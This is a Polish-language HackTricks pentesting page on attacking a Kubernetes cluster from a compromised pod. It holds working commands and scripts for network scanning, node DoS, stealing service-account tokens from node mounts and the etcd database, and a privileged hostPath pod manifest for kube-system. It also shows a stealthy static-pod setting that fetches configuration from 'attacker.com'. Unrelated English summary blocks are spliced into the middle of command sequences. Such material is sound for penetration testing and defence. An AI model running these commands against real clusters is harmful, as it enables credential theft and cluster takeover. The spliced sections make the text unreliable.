# Atakowanie Kubernetesa od wewnątrz Pojemnika

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>

## **Ucieczka z Pojemnika**

**Jeśli masz szczęście, możesz próbować uciec z niego do węzła:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ucieczka z pojemnika

Aby spróbować uciec z pojemników, możesz najpierw potrzebować **eskaluować uprawnienia**, oto kilka technik, jak to zrobić:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Możesz sprawdzić te **przejścia dockerowe, aby spróbować uciec** z pojemnika, który został skompromitowany:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Nadużywanie Uprawnień Kubernetesa

Jak wyjaśniono w sekcji dotyczącej **enumeracji kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Zazwyczaj pojemniki są uruchamiane z **tokenem konta usługi** wewnątrz nich. To konto usługi może mieć przypisane pewne **uprawnienia**, których możesz **nadużyć**, aby **przenieść** się do innych pojemników lub nawet **uciec** do skonfigurowanych w klastrze węzłów. Sprawdź jak to zrobić:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Nadużywanie Uprawnień Chmurowych

Jeśli pojemnik jest uruchamiany wewnątrz **środowiska chmurowego**, możesz być w stanie **wyciec token z punktu końcowego metadanych** i eskalować uprawnienia, korzystając z niego.

## Wyszukiwanie podatnych usług sieciowych

Jako że jesteś w środowisku Kubernetesa, jeśli nie możesz eskalować uprawnień nadużywając obecnych uprawnień pojemników i nie możesz uciec z kontenera, powinieneś **szukać potencjalnie podatnych usług.**

### Usługi

**W tym celu możesz spróbować uzyskać wszystkie usługi środowiska kubernetes:**
```
kubectl get svc --all-namespaces
```
Domyślnie Kubernetes używa płaskiego schematu sieciowego, co oznacza, że **każdy pod/usługa w klastrze może rozmawiać z innymi**. **Przestrzenie nazw** w klastrze **nie mają domyślnie żadnych ograniczeń związanych z bezpieczeństwem sieciowym**. Każdy w przestrzeni nazw może rozmawiać z innymi przestrzeniami nazw.

### Skanowanie

Następujący skrypt Bash (pochodzący z [warsztatów Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) zainstaluje i zeskanuje zakresy IP klastra Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Sprawdź następującą stronę, aby dowiedzieć się, jak możesz **atakować konkretne usługi Kubernetes** w celu **skompromitowania innych modułów/wszystkiego w środowisku**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Podsłuchiwanie

W przypadku, gdy **skompromitowany pod uruchamia wrażliwą usługę**, do której inne moduły muszą uwierzytelniać, możesz uzyskać dane uwierzytelniające wysyłane z innych modułów, **przechwytując lokalne komunikacje**.

## Podrobienie sieci

Domyślnie techniki takie jak **podrobienie ARP** (i dzięki temu **podrobienie DNS**) działają w sieci kubernetes. Następnie, wewnątrz modułu, jeśli masz **zdolność NET\_RAW** (która jest domyślnie dostępna), będziesz mógł wysyłać specjalnie spreparowane pakiety sieciowe i przeprowadzać **ataki typu MitM poprzez podrobienie ARP do wszystkich modułów działających na tym samym węźle.**\
Co więcej, jeśli **złośliwy pod** działa na **tym samym węźle co serwer DNS**, będziesz mógł przeprowadzić **atak podrobienia DNS na wszystkie moduły w klastrze**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS węzła

W manifestach Kubernetes nie ma określenia zasobów i **nie są stosowane limity** dla kontenerów. Jako atakujący, możemy **zużyć wszystkie zasoby, na których działa pod/wdrożenie** i wyczerpać inne zasoby, powodując DoS dla środowiska.

Można to zrobić za pomocą narzędzia takiego jak [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Możesz zobaczyć różnicę podczas uruchamiania `stress-ng` i po.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-Eksploatacja Węzła

Jeśli udało ci się **uciec z kontenera**, znajdziesz kilka interesujących rzeczy w węźle:

* Proces **Kontener Runtime** (Docker)
* Więcej **pods/kontenerów** działających w węźle, których można nadużyć (więcej tokenów)
* Cały **system plików** i **system operacyjny** ogólnie
* Usługa **Kube-Proxy** nasłuchująca
* Usługa **Kubelet** nasłuchująca. Sprawdź pliki konfiguracyjne:
  * Katalog: `/var/lib/kubelet/`
  * `/var/lib/kubelet/kubeconfig`
  * `/var/lib/kubelet/kubelet.conf`
  * `/var/lib/kubelet/config.yaml`
  * `/var/lib/kubelet/kubeadm-flags.env`
  * `/etc/kubernetes/kubelet-kubeconfig`
* Inne **wspólne pliki kubernetes**:
  * `$HOME/.kube/config` - **Konfiguracja Użytkownika**
  * `/etc/kubernetes/kubelet.conf`- **Zwykła Konfiguracja**
  * `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracja Bootstrap**
  * `/etc/kubernetes/manifests/etcd.yaml` - **Konfiguracja etcd**
  * `/etc/kubernetes/pki` - **Klucz Kubernetes**

### Znajdź kubeconfig węzła

Jeśli nie możesz znaleźć pliku kubeconfig w jednej z wcześniej skomentowanych ścieżek, **sprawdź argument `--kubeconfig` procesu kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Ukradnij sekrety
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skrypt [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatycznie **pobierze tokeny innych modułów i sprawdzi, czy mają uprawnienie**, którego szukasz (zamiast sprawdzania po kolei):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Przywilejowane DaemonSety

DaemonSet to **pod**, który będzie **uruchamiany** na **wszystkich węzłach klastra**. Dlatego jeśli DaemonSet jest skonfigurowany z **uprzywilejowanym kontem usługi**, na **WSZYSTKICH węzłach** będziesz mógł znaleźć **token** tego **uprzywilejowanego konta usługi**, który mógłbyś wykorzystać.

Wykorzystanie jest takie samo jak w poprzednim rozdziale, ale teraz nie zależy to już od szczęścia.

### Przejście do Chmury

Jeśli klaster jest zarządzany przez usługę chmurową, zazwyczaj **Węzeł będzie miał inny dostęp do punktu końcowego metadanych** niż Pod. Dlatego spróbuj **uzyskać dostęp do punktu końcowego metadanych z węzła** (lub z pod z hostNetwork ustawionym na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Ukradnij etcd

Jeśli możesz określić [**nazwęWęzła**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) Węzła, na którym zostanie uruchomiony kontener, uzyskaj powłokę wewnątrz węzła płaszczyzny kontrolnej i zdobądź **bazę danych etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Węzły płaszczyzny kontrolnej mają **rolę master** i w **zarządzanych klastrach w chmurze nie będzie można uruchomić na nich niczego**.

#### Odczytaj tajemnice z etcd

Jeśli możesz uruchomić swój pod na węźle płaszczyzny kontrolnej, używając selektora `nodeName` w specyfikacji poda, możesz łatwo uzyskać dostęp do bazy danych `etcd`, która zawiera całą konfigurację klastra, w tym wszystkie tajemnice.

Poniżej znajduje się szybki i brudny sposób pobrania tajemnic z `etcd`, jeśli działa on na węźle płaszczyzny kontrolnej, na którym się znajdujesz. Jeśli chcesz bardziej eleganckie rozwiązanie, które uruchamia poda z narzędziem klienta `etcd` o nazwie `etcdctl` i używa poświadczeń węzła płaszczyzny kontrolnej do połączenia się z `etcd`, gdziekolwiek jest uruchomiony, sprawdź [ten przykładowy manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Sprawdź, czy `etcd` działa na węźle płaszczyzny kontrolnej i zobacz, gdzie znajduje się baza danych (To jest na klastrze utworzonym za pomocą `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a pod within a Kubernetes cluster, there are several techniques that can be used to escalate privileges and potentially take control of the entire cluster. This section outlines some common attack vectors and best practices to secure your Kubernetes environment.

### Pod Security Context

Pods in Kubernetes run with a set of security parameters defined in the PodSecurityContext. Attackers can try to escalate privileges by modifying these parameters. For example, an attacker could try to run a pod as a privileged user or gain access to the host network.

### Service Account Tokens

Service account tokens are used by pods to authenticate with the Kubernetes API server. If an attacker gains access to a pod's service account token, they can potentially interact with the Kubernetes API server and perform malicious actions.

### Kubernetes API Access

If an attacker gains access to the Kubernetes API from inside a pod, they can perform a variety of actions, such as creating or deleting resources, deploying new pods, or even taking control of the entire cluster.

### Network Policies

Properly configured network policies can help prevent lateral movement within a Kubernetes cluster. Attackers may try to exploit misconfigured network policies to gain access to sensitive resources or perform reconnaissance within the cluster.

### Best Practices

- Regularly review and update pod security context settings.
- Limit the use of privileged pods and service account permissions.
- Rotate service account tokens regularly.
- Implement network policies to restrict pod-to-pod communication.
- Monitor pod activities and API server interactions for any suspicious behavior.

By following these best practices and staying informed about the latest Kubernetes security threats, you can better protect your Kubernetes clusters from internal attacks.
```
```bash
data-dir=/var/lib/etcd
```
**Wyświetl dane w bazie danych etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Wyodrębnij tokeny z bazy danych i pokaż nazwę konta usługi**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**To samo polecenie, ale dodane kilka grepsów, aby zwrócić tylko domyślny token w przestrzeni nazw kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they can leverage this access to perform various malicious activities within the cluster. This section explores some common techniques that attackers can use to escalate privileges and move laterally within the Kubernetes environment.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

Attackers can abuse misconfigured Role-Based Access Control (RBAC) roles to escalate their privileges within the cluster. By assigning themselves higher privileges than intended, attackers can gain access to resources and perform actions they are not supposed to.

#### Accessing the Kubernetes API Server

Once inside a pod, attackers can attempt to access the Kubernetes API server using tools like `kubectl` or by directly interacting with the API server endpoints. This access can allow them to gather sensitive information, modify resources, or even take control of the cluster.

### Lateral Movement

#### Pod Hopping

Attackers can move laterally within the cluster by compromising one pod and then using it as a stepping stone to access other pods. This technique, known as pod hopping, allows attackers to expand their reach and potentially compromise more critical components of the cluster.

#### Service Account Compromise

By compromising a pod's service account, attackers can abuse the permissions associated with that account to access other resources within the cluster. This can enable them to move laterally and escalate privileges further, potentially leading to a full cluster compromise.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the threats that can originate from within the cluster. By understanding common attack techniques like privilege escalation and lateral movement, organizations can better defend their Kubernetes environments against malicious actors.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statyczna / Lustrzana Trwałość Podów

_Pody statyczne_ są zarządzane bezpośrednio przez demona kubelet na określonym węźle, bez obserwowania ich przez serwer API. W przeciwieństwie do Podów zarządzanych przez płaszczyznę kontrolną (na przykład Deployment); zamiast tego, **kubelet obserwuje każdy statyczny Pod** (i restartuje go w przypadku awarii).

Dlatego pody statyczne zawsze są **powiązane z jednym Kubeletem** na określonym węźle.

**Kubelet automatycznie próbuje utworzyć lustrzany Pod na serwerze API Kubernetes** dla każdego statycznego Poda. Oznacza to, że Pody uruchomione na węźle są widoczne na serwerze API, ale nie można nimi sterować stamtąd. Nazwy Podów będą z sufiksem z nazwą hosta węzła poprzedzoną myślnikiem.

{% hint style="danger" %}
**`Spec` statycznego Poda nie może odnosić się do innych obiektów API** (np. ServiceAccount, ConfigMap, Secret, itp. Dlatego **nie można nadużyć tego zachowania, aby uruchomić pod z dowolnym serviceAccount** w bieżącym węźle w celu skompromitowania klastra. Ale można użyć tego do uruchamiania podów w różnych przestrzeniach nazw (jeśli jest to przydatne z jakiegoś powodu).
{% endhint %}

Jeśli jesteś wewnątrz hosta węzła, możesz sprawić, że **utworzy on statyczny pod wewnątrz siebie**. Jest to dość przydatne, ponieważ może pozwolić Ci **utworzyć pod w innej przestrzeni nazw** jak **kube-system**.

Aby utworzyć statyczny pod, [**dokumentacja jest wielką pomocą**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). W zasadzie potrzebujesz 2 rzeczy:

* Skonfiguruj parametr **`--pod-manifest-path=/etc/kubernetes/manifests`** w **usłudze kubelet**, lub w **konfiguracji kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i zrestartuj usługę
* Utwórz definicję w **definicji poda** w **`/etc/kubernetes/manifests`**

**Innym bardziej skrytym sposobem byłoby:**

* Zmodyfikuj parametr **`staticPodURL`** w pliku konfiguracyjnym **kubelet** i ustaw coś w rodzaju `staticPodURL: http://attacker.com:8765/pod.yaml`. Spowoduje to, że proces kubeletu utworzy **statyczny pod**, pobierając **konfigurację z podanego adresu URL**.

**Przykład** konfiguracji **poda** do utworzenia poda z uprawnieniami w **kube-system** zaczerpnięty z [**tutaj**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Usuwanie modułów + węzły nieskalowalne

Jeśli atakujący **skompromituje węzeł** i będzie mógł **usunąć moduły** z innych węzłów oraz sprawić, że inne węzły nie będą w stanie wykonywać modułów, moduły zostaną uruchomione ponownie na skompromitowanym węźle, co umożliwi mu **ukradzenie tokenów** uruchamianych w nich.\
Aby uzyskać [**więcej informacji, kliknij ten link**](nadużywanie-ról-clusterroles-w-kubernetes/#usuwanie-modułów-+-węzły-nieskalowalne).

## Automatyczne narzędzia

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
